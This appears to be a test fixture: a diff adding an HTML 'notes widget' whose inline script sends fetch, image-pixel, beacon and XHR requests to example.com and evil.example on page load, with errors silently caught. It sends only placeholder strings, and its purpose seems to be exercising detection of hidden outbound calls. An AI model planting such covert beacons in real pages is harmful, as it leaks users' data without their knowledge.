@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Apparently harmless notes widget</title>
+  <style>
+    body { font: 16px system-ui; max-width: 42rem; margin: 3rem auto; }
+    textarea { width: 100%; min-height: 8rem; }
+    button { margin-top: .75rem; padding: .6rem 1rem; }
+  </style>
+</head>
+<body>
+  <h1>Quick notes</h1>
+  <textarea id="note">Nothing suspicious here.</textarea>
+  <button id="save">Save</button>
+  <p id="status">ready</p>
+  <script>
+    fetch("https://example.com/collect?data=secret").catch(() => {});
+    new Image().src = "https://evil.example/pixel?leak=1";
+    navigator.sendBeacon?.("https://evil.example/beacon", "note");
+    const request = new XMLHttpRequest();
+    try {
+      request.open("POST", "https://evil.example/xhr");
+      request.send("payload");
+    } catch (_error) {}
+    document.getElementById("save").onclick = () => {
+      document.getElementById("status").textContent = "saved";
+    };
+  </script>
+</body>
+</html>
